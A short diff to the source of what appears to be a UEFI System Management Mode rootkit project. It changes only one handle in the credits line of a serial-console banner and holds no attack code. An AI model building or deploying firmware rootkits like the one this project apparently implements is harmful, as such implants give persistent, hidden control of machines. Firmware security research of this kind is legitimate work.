@@ -94,7 +94,7 @@ EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *Syste
   SerialPrintString("|                                          |\r\n");
   SerialPrintString("|          S M M    R O O T K I T          |\r\n");
   SerialPrintString("|                                          |\r\n");
-  SerialPrintString("|    shoutout to   rainbowrawr, Cr4sh,     |\r\n");
+  SerialPrintString("|       shoutout to    rain, Cr4sh,        |\r\n");
   SerialPrintString("|   ufrisk, Heep042, authors of LongKit    |\r\n");
   SerialPrintString("|                                          |\r\n");
   SerialPrintString("--------------------------------------------\r\n");
